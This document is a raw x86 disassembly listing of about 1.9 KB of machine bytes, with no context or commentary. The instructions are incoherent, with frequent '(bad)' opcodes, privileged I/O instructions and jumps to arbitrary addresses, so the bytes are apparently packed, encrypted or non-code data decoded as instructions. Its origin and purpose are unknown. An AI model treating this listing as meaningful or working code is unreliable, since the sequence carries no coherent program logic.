  48f749:	xchg   BYTE PTR [ecx+0x785a1788],bh
  48f74f:	pop    ds
  48f750:	push   edi
  48f751:	push   ds
  48f752:	pop    ss
  48f753:	xor    eax,ebp
  48f755:	push   ecx
  48f756:	scas   al,BYTE PTR es:[edi]
  48f757:	add    BYTE PTR [ebx-0x7663b1d5],bl
  48f75d:	pusha  
  48f75e:	dec    ebx
  48f75f:	dec    edx
  48f760:	mov    ds:0x4d1c45c5,al
  48f765:	rol    BYTE PTR [edi-0x5ed33a36],1
  48f76b:	inc    eax
  48f76c:	or     eax,0x8e65c5de
  48f771:	jae    0x48f78d
  48f773:	dec    esi
  48f774:	mov    esp,0x688ac2ca
  48f779:	ret    0xe052
  48f77c:	aam    0x92
  48f77e:	and    al,0xa2
  48f780:	aas    
  48f781:	xchg   ebp,eax
  48f782:	mov    ds:0xd9dce031,eax
  48f787:	out    dx,al
  48f788:	jmp    0x48f7bf
  48f78a:	mov    eax,ds:0x788caf89
  48f78f:	push   0x8
  48f791:	push   eax
  48f792:	(bad)  [esp+ebp*8+0x339a0feb]
  48f799:	push   ebx
  48f79a:	repnz push esi
  48f79c:	ja     0x48f780
  48f79e:	fld    QWORD PTR [eax+0x10]
  48f7a1:	jge    0x48f7c5
  48f7a3:	xor    eax,0x2e7140d8
  48f7a8:	int    0x5e
  48f7aa:	test   BYTE PTR [ebp-0x6dc50ec8],bl
  48f7b0:	add    al,0x7
  48f7b2:	sub    esp,DWORD PTR [ecx-0x7c]
  48f7b5:	pop    eax
  48f7b6:	dec    esp
  48f7b7:	scas   al,BYTE PTR es:[edi]
  48f7b8:	(bad)  
  48f7b9:	leave  
  48f7ba:	imul   ebp,DWORD PTR [eax],0x8c2c4611
  48f7c0:	into   
  48f7c1:	cs aam 0x55
  48f7c4:	les    ecx,FWORD PTR ds:0x9c6cb8a
  48f7ca:	sbb    bl,bh
  48f7cc:	cmp    BYTE PTR [ebx],0x2b
  48f7cf:	cld    
  48f7d0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f7d1:	jae    0x48f7ef
  48f7d3:	imul   ebp,esp,0x17883f38
  48f7d9:	jge    0x48f846
  48f7db:	scas   al,BYTE PTR es:[edi]
  48f7dc:	jge    0x48f816
  48f7de:	push   edi
  48f7df:	push   ds
  48f7e0:	mov    dl,0x93
  48f7e2:	adc    al,0x40
  48f7e4:	iret   
  48f7e5:	push   0x65
  48f7e7:	jo     0x48f841
  48f7e9:	call   DWORD PTR [edx+0x50ddb288]
  48f7ef:	push   esp
  48f7f0:	push   edi
  48f7f1:	sub    al,0xb6
  48f7f3:	out    0x24,al
  48f7f5:	mov    esp,0x32429950
  48f7fa:	(bad)  
  48f7fb:	xchg   esp,eax
  48f7fc:	push   eax
  48f7fd:	cdq    
  48f7fe:	push   ebx
  48f7ff:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48f800:	pop    edx
  48f801:	cmp    BYTE PTR [eax-0x501b619b],ch
  48f807:	ret    
  48f808:	scas   al,BYTE PTR es:[edi]
  48f809:	jmp    0x48f84c
  48f80b:	loope  0x48f7b7
  48f80d:	or     DWORD PTR [ebx+ebp*2-0x7e177598],esp
  48f814:	addr16 fcmovb st,st(5)
  48f817:	sub    dh,BYTE PTR [eax+0x56]
  48f81a:	and    eax,0x537b0dde
  48f81f:	sub    eax,0xaf7ad4b
  48f824:	pusha  
  48f825:	xor    ebp,ebx
  48f827:	sbb    ebx,DWORD PTR [edx-0xaa6e49a]
  48f82d:	push   esp
  48f82e:	mov    esp,esp
  48f830:	or     bl,BYTE PTR [eax+0x58]
  48f833:	sbb    edx,0x510cb268
  48f839:	loopne 0x48f858
  48f83b:	cmp    BYTE PTR [ebx-0x6f],dl
  48f83e:	scas   eax,DWORD PTR es:[edi]
  48f83f:	jg     0x48f809
  48f841:	sub    al,0xd5
  48f843:	pop    ss
  48f844:	inc    edx
  48f845:	ret    
  48f846:	shl    DWORD PTR [eax+ebx*4],0xa0
  48f84a:	loope  0x48f8b9
  48f84c:	and    eax,0x786c2228
  48f851:	pop    es
  48f852:	push   eax
  48f853:	cmp    dl,0xe1
  48f856:	xchg   ebp,eax
  48f857:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f858:	pop    ebx
  48f859:	push   es
  48f85a:	in     eax,dx
  48f85b:	or     cl,BYTE PTR [esi]
  48f85d:	mov    esi,0x4974f6fa
  48f862:	scas   eax,DWORD PTR es:[edi]
  48f863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48f864:	ins    BYTE PTR es:[edi],dx
  48f865:	inc    ebx
  48f866:	imul   edi,DWORD PTR [eax],0x7fec3dc1
  48f86c:	xor    al,BYTE PTR [ebx-0x7600fbb2]
  48f872:	inc    esi
  48f873:	into   
  48f874:	jmp    0x48f7ff
  48f876:	jle    0x48f8cc
  48f878:	xor    cl,BYTE PTR ds:0x3c674ff
  48f87e:	or     BYTE PTR [edx+0x3d1a6856],al
  48f884:	inc    ecx
  48f885:	xchg   DWORD PTR [ebp+0x4a829c1c],ecx
  48f88b:	add    BYTE PTR [esp+ebx*1-0x75],ch
  48f88f:	(bad)  [edi]
  48f891:	ins    BYTE PTR es:[edi],dx
  48f892:	imul   esi,DWORD PTR ds:0x7404427,0x4899ef53
  48f89c:	and    DWORD PTR [ecx-0x50],esi
  48f89f:	pop    ecx
  48f8a0:	lock cld 
  48f8a2:	ror    DWORD PTR [eax+ebx*8-0x14932a9b],1
  48f8a9:	or     dl,BYTE PTR [edx+0x734c1274]
  48f8af:	add    edi,edi
  48f8b1:	and    eax,ebp
  48f8b3:	jne    0x48f8a5
  48f8b5:	cmp    WORD PTR [eax],dx
  48f8b8:	je     0x48f920
  48f8ba:	dec    ebp
  48f8bb:	and    eax,esp
  48f8bd:	push   eax
  48f8be:	dec    ebx
  48f8bf:	xor    BYTE PTR [eax],dl
  48f8c1:	je     0x48f897
  48f8c3:	pusha  
  48f8c4:	jmp    0x5d917f74
  48f8c9:	mov    esi,0xdff38b3b
  48f8ce:	jnp    0x48f8a4
  48f8d0:	jge    0x48f862
  48f8d2:	adc    cl,BYTE PTR [ebx-0x7ce78a31]
  48f8d8:	push   cs
  48f8d9:	jne    0x48f866
  48f8db:	adc    BYTE PTR [edi-0x21ee1fe3],ah
  48f8e1:	(bad)  
  48f8e3:	xchg   DWORD PTR [ebx+0x14c048d0],ecx
  48f8e9:	sbb    BYTE PTR [ebp+0x1dbbb566],dl
  48f8ef:	lock loop 0x48f8da
  48f8f2:	add    ch,BYTE PTR [esi]
  48f8f4:	fmul   DWORD PTR [eax]
  48f8f6:	jne    0x48f8ec
  48f8f8:	or     bl,ah
  48f8fa:	jno    0x48f8a3
  48f8fc:	ret    
  48f8fd:	ret    
  48f8fe:	push   ecx
  48f8ff:	add    eax,ecx
  48f901:	mov    ds:0xb42c1f5a,al
  48f906:	adc    al,0xea
  48f908:	push   ss
  48f909:	add    DWORD PTR [ecx],esi
  48f90b:	mov    edi,DWORD PTR [eax*1-0x75ba63dd]
  48f912:	add    al,al
  48f914:	lock dec esi
  48f916:	jae    0x48f908
  48f918:	aad    0xf2
  48f91a:	mov    esp,0xf63778c7
  48f91f:	rol    BYTE PTR [edx-0x59],0xa4
  48f923:	mov    fs,WORD PTR [eax]
  48f925:	dec    ebx
  48f926:	pop    ebx
  48f927:	jae    0x48f965
  48f929:	ror    DWORD PTR [edi],1
  48f92b:	aad    0x16
  48f92d:	sbb    bh,BYTE PTR [esi+0x41ef733c]
  48f933:	adc    DWORD PTR [esi+0x24394a75],0xc656d73b
  48f93d:	into   
  48f93e:	xchg   edx,eax
  48f93f:	test   al,0x3c
  48f941:	push   ss
  48f942:	lock fnstcw WORD PTR [ecx-0x46]
  48f946:	and    ebx,DWORD PTR [eax]
  48f948:	jbe    0x48f9b3
  48f94a:	jne    0x48f920
  48f94c:	xor    al,0x32
  48f94e:	add    DWORD PTR [esi],ebx
  48f950:	sbb    DWORD PTR [edx-0x80],0x8c6ac81a
  48f957:	and    al,BYTE PTR [ecx-0x3ed41fc3]
  48f95d:	xor    BYTE PTR [ebx],ah
  48f95f:	adc    BYTE PTR [eax-0x325d0175],bh
  48f965:	(bad)  
  48f966:	jne    0x48f91a
  48f968:	sar    eax,0x5
  48f96b:	lea    edx,[eax*4+0x601bff20]
  48f972:	ss repnz xor ah,dh
  48f976:	pop    ds
  48f977:	shl    esi,0x6
  48f97a:	add    ecx,esi
  48f97c:	mov    al,BYTE PTR [ecx+0x24]
  48f97f:	neg    BYTE PTR [edi]
  48f981:	hlt    
  48f982:	inc    DWORD PTR [edx]
  48f984:	rcl    BYTE PTR [edi+0xf],0xb6
  48f988:	jns    0x48f98e
  48f98a:	movsx  eax,al
  48f98d:	and    edi,0x81f8d186
  48f993:	sti    
  48f994:	add    BYTE PTR [eax+0xe],al
  48f997:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48f998:	stc    
  48f999:	cmp    al,0xcf
  48f99b:	je     0x48f9ed
  48f99d:	add    BYTE PTR [edx+0x0],0x1
  48f9a1:	outs   dx,DWORD PTR es:[esi]
  48f9a3:	fild   QWORD PTR [edx]
  48f9a5:	dec    ebp
  48f9a6:	add    bl,BYTE PTR [esi]
  48f9a8:	add    al,0xfe
  48f9aa:	cmp    eax,0x80044980
  48f9af:	xchg   esp,eax
  48f9b0:	lea    ecx,[ecx+esi*1+0x24]
  48f9b4:	outs   dx,DWORD PTR ds:[esi]
  48f9b5:	es idiv bh
  48f9b8:	mov    dl,BYTE PTR [ecx]
  48f9ba:	and    dl,0x81
  48f9bd:	or     dl,0x1
  48f9c0:	mov    BYTE PTR [ecx],dl
  48f9c2:	jmp    0x48f9eb
  48f9c4:	sub    eax,DWORD PTR [edx-0x7f1714fe]
  48f9ca:	mov    al,ds:0x61fb4d70
  48f9cf:	add    al,0x7f
  48f9d1:	jmp    0x48f9e0
  48f9d3:	xor    eax,DWORD PTR [eax-0x7e44bf32]
  48f9d9:	sar    ebp,0xfe
  48f9dc:	jne    0x48f9e5
  48f9de:	mov    eax,0x256bb0c5
  48f9e3:	add    al,al
  48f9e5:	adc    al,0xae
  48f9e7:	inc    edi
  48f9e8:	sub    bl,BYTE PTR [ebp+eax*1-0xb]
  48f9ec:	sub    eax,0x20f81d5c
  48f9f1:	mov    esi,0x58166a8f
  48f9f6:	inc    eax
  48f9f7:	or     eax,0x7808d87c
  48f9fc:	cwde   
  48f9fd:	fcom   QWORD PTR [eax+0x60681067]
  48fa03:	mov    bh,BYTE PTR ds:0x3e0f825e
  48fa09:	jnp    0x48fa3f
  48fa0b:	cmp    eax,0x773d2d79
  48fa10:	or     al,0x4
  48fa12:	mov    al,0xba
  48fa14:	push   ds
  48fa15:	ins    BYTE PTR es:[edi],dx
  48fa16:	pop    ds
  48fa17:	cmp    eax,0xa6c31883
  48fa1c:	(bad)  
  48fa1d:	adc    BYTE PTR [eax-0x152d126],ch
  48fa23:	mov    al,0x59
  48fa25:	cmp    al,BYTE PTR [esi+0x4093f6e]
  48fa2b:	jecxz  0x48f9b0
  48fa2d:	cmp    eax,0xf40852ec
  48fa32:	sbb    eax,0x31726e10
  48fa37:	sub    DWORD PTR [edx],esi
  48fa39:	shl    cl,cl
  48fa3b:	lds    ecx,FWORD PTR [ebx-0xcc35a3d]
  48fa41:	xchg   ecx,eax
  48fa42:	clc    
  48fa43:	pop    edi
  48fa44:	fs js  0x48fa05
  48fa47:	inc    esp
  48fa48:	xor    BYTE PTR [ebx+eax*4],al
  48fa4b:	loopne 0x48fa4e
  48fa4d:	je     0x48fa22
  48fa4f:	push   ebx
  48fa50:	pop    es
  48fa51:	in     al,dx
  48fa52:	call   0xf62c:0x529e7cb2
  48fa59:	sub    ah,BYTE PTR [esi]
  48fa5b:	call   0x2f2d:0xbb8c3f6b
  48fa62:	bound  ebx,QWORD PTR [ecx+0x30]
  48fa65:	jmp    0x48fa76
  48fa67:	mov    eax,ds:0xae814790
  48fa6c:	and    DWORD PTR [esi],0xffffffff
  48fa6f:	mov    bh,0x31
  48fa71:	sub    eax,0x41bf0d06
  48fa76:	sub    dl,BYTE PTR [ebp+0x512f59f1]
  48fa7c:	or     esi,DWORD PTR [eax+0x408bcd95]
  48fa82:	dec    ecx
  48fa83:	sbb    ah,BYTE PTR [ecx-0xc5e897b]
  48fa89:	sbb    eax,0x9520d5c0
  48fa8e:	rcl    DWORD PTR [esi],0xd4
  48fa91:	jnp    0x48fa8a
  48fa93:	mov    cl,BYTE PTR [eax-0x7b]
  48fa96:	in     eax,dx
  48fa97:	mov    edi,0x37b78ce2
  48fa9c:	test   al,0x51
  48fa9e:	(bad)  
  48fa9f:	mul    esp
  48faa1:	ja     0x48fa79
  48faa3:	imul   ebp,DWORD PTR [esi-0x9]
  48faa7:	inc    esi
  48faa8:	or     al,0x70
  48faaa:	sbb    eax,DWORD PTR [edi+0x3]
  48faad:	stos   BYTE PTR es:[edi],al
  48faae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48faaf:	dec    edx
  48fab0:	add    BYTE PTR [edi+0x59],dh
  48fab3:	push   esp
  48fab4:	mov    ebx,edi
  48fab6:	je     0x48fa74
  48fab8:	fisub  WORD PTR [edx+0x4188dbe]
  48fabe:	pop    es
  48fabf:	jle    0x48fae4
  48fac1:	push   ecx
  48fac2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48fac3:	xchg   BYTE PTR [eax-0x44],cl
  48fac6:	out    0xca,eax
  48fac8:	mov    esi,0x8194a0bb
  48facd:	loope  0x48fad7
  48facf:	push   edx
  48fad0:	je     0x48fb01
  48fad2:	inc    edx
  48fad3:	test   eax,0x5721eeef
  48fad8:	js     0x3c442a8d
  48fade:	fdiv   DWORD PTR [edx+0x2]
  48fae1:	dec    edx
  48fae2:	pop    edx
  48fae3:	sub    BYTE PTR gs:[esi+esi*1],bh
  48fae7:	push   DWORD PTR [esi]
  48fae9:	(bad)  
  48faea:	sbb    eax,0x296dd868
  48faef:	jle    0x48fb05
  48faf1:	ds sub bx,di
  48faf5:	add    DWORD PTR [ebp-0x4],edi
  48faf8:	jmp    0x48fb49
  48fafa:	cmp    edx,edi
  48fafc:	or     dl,ch
  48fafe:	es jo  0x48fb50
  48fb01:	or     al,0x21
  48fb03:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48fb04:	mov    dl,0x3e
  48fb06:	mov    al,0x34
  48fb08:	cmp    ah,al
  48fb0a:	jge    0x48fae6
  48fb0c:	jb     0x48faf5
  48fb0e:	fisub  WORD PTR [ecx]
  48fb10:	les    esi,FWORD PTR [ecx+ecx*1+0x16]
  48fb14:	cmp    BYTE PTR [ebp-0x8],dh
  48fb17:	sub    edi,edx
  48fb19:	jge    0x48fb5a
  48fb1b:	add    DWORD PTR [edx],esi
  48fb1d:	dec    ebp
  48fb1e:	js     0x48fb51
  48fb20:	xor    eax,0xa7125059
  48fb25:	add    eax,0x4e954ddb
  48fb2a:	retf   0x3b61
  48fb2d:	(bad)  
  48fb2e:	ja     0x48faee
  48fb30:	enter  0x4001,0x2b
  48fb34:	or     al,0x20
  48fb36:	or     BYTE PTR [esi+0x507214d9],dh
  48fb3c:	in     al,0xa
  48fb3e:	shl    BYTE PTR [ecx],0xa5
  48fb41:	xor    BYTE PTR [eax+0xe0dc710],dl
  48fb47:	ins    BYTE PTR es:[edi],dx
  48fb48:	mov    bh,0xae
  48fb4a:	push   ebx
  48fb4b:	sub    edi,edi
  48fb4d:	es jbe 0x48fb9b
  48fb50:	js     0x48fb78
  48fb52:	add    al,0xd1
  48fb54:	mov    al,ds:0x17d7fc2
  48fb59:	add    DWORD PTR [ecx-0x3f],eax
  48fb5c:	push   ds
  48fb5d:	inc    esi
  48fb5e:	sbb    eax,0x8c05b6e4
  48fb63:	or     DWORD PTR [ebx+edx*8+0x6009758e],0xffffffc3
  48fb6b:	push   es
  48fb6c:	or     al,0x23
  48fb6e:	inc    ebp
  48fb6f:	adc    eax,0xa6681526
  48fb74:	jmp    0x48fb2e
  48fb76:	sub    dl,0x10
  48fb79:	test   eax,0x740cf600
  48fb7e:	and    DWORD PTR [eax],ecx
  48fb80:	push   ss
  48fb81:	sbb    al,0x3e
  48fb83:	dec    eax
  48fb84:	or     eax,0x3b060bf
  48fb89:	sbb    BYTE PTR [edi-0x5bf81ea5],dh
  48fb8f:	xchg   ebx,ecx
  48fb91:	inc    esp
  48fb92:	ins    DWORD PTR es:[edi],dx
  48fb93:	repnz push ss
  48fb95:	gs cwde 
  48fb97:	xlat   BYTE PTR ds:[ebx]
  48fb98:	mov    eax,ds:0x8a5b31af
  48fb9d:	(bad)  
  48fb9f:	ror    BYTE PTR [ebx+0x33],0x22
  48fba3:	jmp    0x48fb6b
  48fba5:	addr16 loopne 0x48fb94
  48fba8:	cmp    ah,BYTE PTR [esp+ecx*1]
  48fbab:	jns    0x48fb9f
  48fbad:	mov    al,ds:0xf768e48c
  48fbb2:	and    eax,0xfbdcacca
  48fbb7:	jmp    0x6ae8717f
  48fbbc:	lock sbb BYTE PTR [ebp-0x7cfd7cc],0x47
  48fbc4:	je     0x48fbc2
  48fbc6:	pop    edi
  48fbc7:	ror    BYTE PTR [ecx+0x357c8dc],1
  48fbcd:	pop    ebp
  48fbce:	cld    
  48fbcf:	test   BYTE PTR [edi+0xc],0x40
  48fbd3:	jne    0x48fc44
  48fbd5:	push   edi
  48fbd6:	xchg   edi,eax
  48fbd7:	sar    DWORD PTR [esi],1
  48fbd9:	cmp    al,0x9d
  48fbdb:	aaa    
  48fbdc:	sbb    ecx,DWORD PTR [eax]
  48fbde:	(bad)  
  48fbdf:	push   eax
  48fbe0:	fidiv  DWORD PTR [ebp+ebp*2+0x78]
  48fbe4:	rol    cl,1
  48fbe6:	cli    
  48fbe7:	add    eax,0x38e18392
  48fbec:	loope  0x48fbfa
  48fbee:	xchg   ebp,eax
  48fbef:	fst    st(5)
  48fbf1:	test   DWORD PTR [edi],esi
  48fbf3:	mov    cl,0xeb
  48fbf5:	add    eax,0xf67e50b9
  48fbfa:	push   eax
  48fbfb:	jg     0x48fc72
  48fbfd:	sub    DWORD PTR [ecx+0x55d2ab76],ecx
  48fc03:	sbb    DWORD PTR [esi+eiz*2],edx
  48fc06:	stc    
  48fc07:	add    eax,0xc8cbaaca
  48fc0c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48fc0d:	push   eax
  48fc0e:	loopne 0x48fc14
  48fc10:	lea    edi,[eax-0x5cfa45c0]
  48fc16:	push   ecx
  48fc17:	pusha  
  48fc18:	cmp    al,0x23
  48fc1a:	mov    dh,0x16
  48fc1c:	in     al,0xa3
  48fc1e:	or     al,0x30
  48fc20:	les    esi,FWORD PTR [ebp+0x23]
  48fc23:	mov    ebp,DWORD PTR [esi]
  48fc25:	dec    ebx
  48fc26:	adc    esp,edx
  48fc28:	shr    DWORD PTR [esi+0x1f],0xa9
  48fc2c:	pop    ss
  48fc2d:	cli    
  48fc2e:	push   edi
  48fc2f:	push   esi
  48fc30:	mov    edi,0x390c341c
  48fc35:	dec    ebp
  48fc36:	pop    es
  48fc37:	xor    al,0x2e
  48fc39:	push   ss
  48fc3a:	or     BYTE PTR [ebx+0x3],dh
  48fc3d:	cmp    BYTE PTR [edx+0x3f0ccfb9],bl
  48fc43:	jle    0x48fc08
  48fc45:	add    eax,0x3e1800c
  48fc4a:	and    al,BYTE PTR [eax+0x407502f9]
  48fc50:	test   eax,0x2d0e39f9
  48fc55:	adc    bl,BYTE PTR [edx]
  48fc57:	scas   al,BYTE PTR es:[edi]
  48fc58:	jmp    0xd081:0x27b62b3e
  48fc5f:	icebp  
  48fc60:	jle    0x48fc8e
  48fc62:	push   edi
  48fc63:	push   eax
  48fc64:	gs test al,0x52
  48fc67:	xor    eax,0x6e0f5fa5
  48fc6c:	test   al,al
  48fc6e:	jns    0x48fc6c
  48fc70:	std    
  48fc71:	add    al,0xd8
  48fc73:	loop   0x48fc07
  48fc75:	inc    esp
  48fc76:	pop    es
  48fc77:	mov    edi,0x701ccb83
  48fc7c:	sbb    ah,ah
  48fc7e:	cli    
  48fc7f:	jo     0x48fc04
  48fc81:	dec    ax
  48fc83:	cmp    al,0xe4
  48fc85:	pop    ds
  48fc86:	cmp    eax,0xcd331db9
  48fc8b:	or     DWORD PTR fs:[ebx],esi
  48fc8e:	call   0x1db0cfec
  48fc93:	shr    ebx,1
  48fc95:	das    
  48fc96:	inc    ebp
  48fc97:	je     0x48fc45
  48fc99:	jmp    0x48fcba
  48fc9b:	cmp    bl,BYTE PTR [edx]
  48fc9d:	ja     0x48fc78
  48fc9f:	scas   eax,DWORD PTR es:[edi]
  48fca0:	fst    QWORD PTR [ecx+edx*8]
  48fca3:	iret   
  48fca4:	mov    ch,0x1f
  48fca6:	pop    ecx
  48fca7:	cmp    al,0x16
  48fca9:	add    al,0x50
  48fcab:	mov    BYTE PTR [esi+0x175d5ebc],bl
  48fcb1:	test   eax,0x14765721
  48fcb6:	push   0x89ad12c0
  48fcbb:	adc    ebx,DWORD PTR [edx-0x1c]
  48fcbe:	add    al,0xdc
  48fcc0:	mov    ds:0xc3928550,al
  48fcc5:	imul   edi,eax,0x183b9e90
  48fccb:	les    eax,FWORD PTR ds:0xba4035c6
  48fcd1:	jge    0xb41475a
  48fcd7:	loopne 0x48fd4b
  48fcd9:	xor    BYTE PTR [eax-0x73],bh
  48fcdc:	add    al,0xb0
  48fcde:	cmp    DWORD PTR [eax],edi
  48fce0:	xchg   ebp,eax
  48fce1:	push   ebp
  48fce2:	je     0x48fd54
  48fce4:	js     0x48fc82
  48fce6:	retf   0x1274
  48fce9:	or     al,0x2a
  48fceb:	retf   0x6f09
  48fcee:	sub    al,BYTE PTR [edx+0x58]
  48fcf1:	mov    dh,0x9
  48fcf3:	cmp    cl,0x45
  48fcf6:	mov    edx,DWORD PTR [esi]
  48fcf8:	test   cl,0x3c
  48fcfb:	aas    
  48fcfc:	mov    esi,0x392ffdd8
  48fd01:	push   ebp
  48fd02:	or     BYTE PTR [ebp+0x11],dh
  48fd05:	cmc    
  48fd06:	xor    al,0xa0
  48fd08:	fwait
  48fd09:	push   ds
  48fd0a:	(bad)  
  48fd0b:	jl     0x48fd26
  48fd0d:	cmp    DWORD PTR [edi-0x45],ecx
  48fd10:	cmp    DWORD PTR [edx+eiz*8],edx
  48fd13:	cmp    BYTE PTR [esi],0x2
  48fd16:	je     0x48fd27
  48fd18:	xor    eax,0x90375
  48fd1d:	(bad)  
  48fd1e:	adc    ecx,DWORD PTR [edi+0x35f81445]
  48fd24:	mov    al,BYTE PTR [esi-0x15]
  48fd27:	test   BYTE PTR [ebx],bh
  48fd29:	icebp  
  48fd2a:	iret   
  48fd2b:	push   esp
  48fd2c:	data16 cli 
  48fd2e:	popf   
  48fd2f:	push   DWORD PTR [eax+esi*4]
  48fd32:	push   esi
  48fd33:	jae    0x48fd4c
  48fd35:	sbb    eax,0x3503153a
  48fd3a:	mov    ecx,0x740a01ba
  48fd3f:	sbb    BYTE PTR [edi],al
  48fd41:	xchg   ecx,eax
  48fd42:	mov    al,BYTE PTR [ebx]
  48fd44:	adc    al,0xdc
  48fd46:	jns    0x48fcce
  48fd48:	add    DWORD PTR [ecx+0x1a],edi
  48fd4b:	loop   0x48fd6b
  48fd4d:	call   0x2e524c5a
  48fd52:	sub    DWORD PTR [edx+0x808de27],ebx
  48fd58:	add    DWORD PTR [edi-0x36bbe1d6],esi
  48fd5e:	or     edi,DWORD PTR ss:[ecx-0x2b4ff249]
  48fd65:	mov    edx,0x2c50a780
  48fd6a:	in     al,dx
  48fd6b:	icebp  
  48fd6c:	and    DWORD PTR [edx-0x53],esp
  48fd6f:	adc    al,0xac
  48fd71:	and    eax,0x491a5840
  48fd76:	out    dx,al
  48fd77:	popa   
  48fd78:	in     al,dx
  48fd79:	(bad)  
  48fd7a:	adc    eax,0x4e2876b0
  48fd7f:	adc    al,0xae
  48fd81:	retf   
  48fd82:	jne    0x48fd99
  48fd84:	jp     0x48fdbd
  48fd86:	adc    DWORD PTR [edi-0x24],0x199cbf48
  48fd8d:	ja     0x48fd93
  48fd8f:	cmp    si,bx
  48fd92:	(bad)  
  48fd93:	xchg   edi,eax
  48fd94:	mov    bl,0xeb
  48fd96:	dec    ebx
  48fd97:	cdq    
  48fd98:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48fd99:	jge    0x48fe0e
  48fd9b:	push   ds
  48fd9c:	shr    BYTE PTR [ecx+esi*4+0x5b],1
  48fda0:	arpl   WORD PTR [esi+0x38],si
  48fda3:	and    BYTE PTR [ecx-0x20],bl
  48fda6:	add    eax,0x8ef602ac
  48fdab:	int3   
  48fdac:	sti    
  48fdad:	add    al,BYTE PTR [ebx+0x2]
  48fdb0:	or     ebx,DWORD PTR [eax]
  48fdb2:	jmp    0x48fdd4
  48fdb4:	(bad)  
  48fdb5:	data16 je 0x48fe13
  48fdb8:	movd   DWORD PTR [edx+0x51],mm5
  48fdbc:	rol    BYTE PTR [eax+edi*8],1
  48fdbf:	into   
  48fdc0:	int3   
  48fdc1:	mov    ch,0xf8
  48fdc3:	push   ecx
  48fdc4:	je     0x48fdca
  48fdc6:	or     bh,ah
  48fdc8:	cmp    BYTE PTR [esi-0x7a],al
  48fdcb:	add    ecx,esi
  48fdcd:	xchg   ecx,eax
  48fdce:	fdiv   st,st(4)
  48fdd0:	pop    ecx
  48fdd1:	pop    esp
  48fdd2:	xor    cl,cl
  48fdd4:	sub    ebp,DWORD PTR [ecx+0x47181e36]
  48fdda:	call   0x6d2519ba
  48fddf:	pop    ebx
  48fde0:	mov    esi,0x73de3b0b
  48fde5:	push   esp
  48fde6:	jl     0x48fdd0
  48fde8:	adc    ebp,0x28
  48fdeb:	cli    
  48fdec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48fded:	mov    ecx,0xe8fe14c1
  48fdf2:	push   esp
  48fdf3:	push   ebx
  48fdf4:	lock xchg ebx,eax
  48fdf6:	into   
  48fdf7:	dec    ecx
  48fdf8:	mov    ebp,0x8b0dc22e
  48fdfd:	and    DWORD PTR [ecx+0x38],0x58950330
  48fe04:	jl     0x48fde6
  48fe06:	stos   DWORD PTR es:[edi],eax
  48fe07:	or     ebp,DWORD PTR [edx+edx*1+0x20]
  48fe0b:	inc    ecx
  48fe0c:	sbb    BYTE PTR [edi+esi*1-0x6a8a7f2b],bl
  48fe13:	into   
  48fe14:	adc    BYTE PTR [eax+0x27c3f0c5],dh
  48fe1a:	loop   0x48fdc7
  48fe1c:	push   0xa61a9a47
  48fe21:	mov    eax,0xc1d68931
  48fe26:	pop    edx
  48fe27:	or     BYTE PTR [ebp-0x7c2b47ff],dh
  48fe2d:	sbb    al,0x25
  48fe2f:	push   es
  48fe30:	push   eax
  48fe31:	pop    ss
  48fe32:	fmul   QWORD PTR [esi]
  48fe34:	xchg   ecx,eax
  48fe35:	in     eax,dx
  48fe36:	sbb    BYTE PTR [edx-0x77fd95da],cl
  48fe3c:	xchg   esp,eax
  48fe3d:	mov    BYTE PTR [ebp-0x3],bl
  48fe40:	pop    es
  48fe41:	adc    al,0x2b
  48fe43:	dec    ebx
  48fe44:	jp     0x48fe8e
  48fe46:	sub    DWORD PTR [esi-0x66],0x23
  48fe4a:	jo     0x48fe76
  48fe4c:	out    0x2c,eax
  48fe4e:	cld    
  48fe4f:	std    
  48fe50:	add    BYTE PTR [ecx+0x15],al
  48fe53:	aam    0x22
  48fe55:	jecxz  0x48fdf9
  48fe57:	dec    esi
  48fe58:	jo     0x48fe5e
  48fe5a:	call   0x3e0:0xe6076a
  48fe61:	push   edx
  48fe62:	push   ecx
  48fe63:	pop    ebx
  48fe64:	sbb    al,0x61
  48fe66:	aas    
  48fe67:	and    al,0xb3
  48fe69:	inc    ecx
  48fe6a:	int3   
  48fe6b:	mov    eax,0xff6f9a0e
  48fe70:	mov    al,ds:0x89104be1
  48fe75:	mov    dh,0x45
  48fe77:	xor    BYTE PTR [ecx],cl
  48fe79:	inc    eax
  48fe7a:	push   ds
  48fe7b:	xchg   esi,eax
  48fe7c:	mov    edi,0xc1f94d44
  48fe81:	loopne 0x48fe8b
  48fe83:	or     eax,ecx
  48fe85:	dec    esi
  48fe86:	lock push ss
  48fe88:	sub    esi,ebp
  48fe8a:	shr    BYTE PTR ds:0x20494b10,cl
  48fe90:	(bad)  
  48fe91:	dec    ebx
  48fe92:	mov    edx,DWORD PTR [ecx]
  48fe94:	inc    esi
  48fe95:	sub    DWORD PTR [esi],esi
  48fe97:	ror    edx,1
  48fe99:	sub    eax,0xee6895d
  48fe9e:	mov    eax,0xdb09faf0
  48fea3:	aad    0xba
  48fea5:	mov    ah,0x66
  48fea7:	and    edx,ecx
  48fea9:	and    BYTE PTR [ebp+0x2d],dh
  48feac:	(bad)  [edx+0x51]
  48feaf:	push   ecx
  48feb0:	js     0x48fe45
  48feb2:	jge    0x48fefb
  48feb4:	sbb    al,0xfc
  48feb6:	or     DWORD PTR [eax+0x52],0xc7448d8
  48febd:	dec    eax
  48febe:	mov    ecx,0x3dc89049
  48fec3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48fec4:	into   
  48fec5:	push   0x4
  48fec7:	pop    eax
  48fec8:	fdivrp st(0),st
  48feca:	inc    edx
  48fecb:	test   eax,ebx
  48fecd:	add    dh,BYTE PTR [edx+0x7c]
  48fed0:	dec    ebp
  48fed1:	push   cs
  48fed2:	and    ecx,0x1588fe06
  48fed8:	mul    BYTE PTR [ebp+ebx*1-0x9]
  48fedc:	inc    ebp
  48fedd:	or     al,0x87
  48fedf:	out    dx,al
  48fee0:	test   al,0x26
  48fee2:	(bad)  
